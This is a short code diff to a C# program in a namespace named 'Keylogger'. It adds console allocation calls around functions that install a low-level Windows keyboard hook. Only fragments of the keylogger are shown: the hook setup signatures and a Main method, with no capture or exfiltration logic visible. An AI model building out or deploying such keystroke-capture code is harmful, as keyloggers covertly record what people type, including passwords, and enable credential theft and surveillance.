@@ -30,6 +30,12 @@ namespace Keylogger
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        [DllImport("kernel32.dll")]
+        private static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll")]
+        private static extern bool FreeConsole();
+
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -86,10 +92,13 @@ namespace Keylogger
         }
         #endregion
 
+        [STAThread]
         static void Main(string[] args)
         {
+            AllocConsole();
             StartTimer();
             HookKeyBoard();
+            FreeConsole();
         }
     }
 }
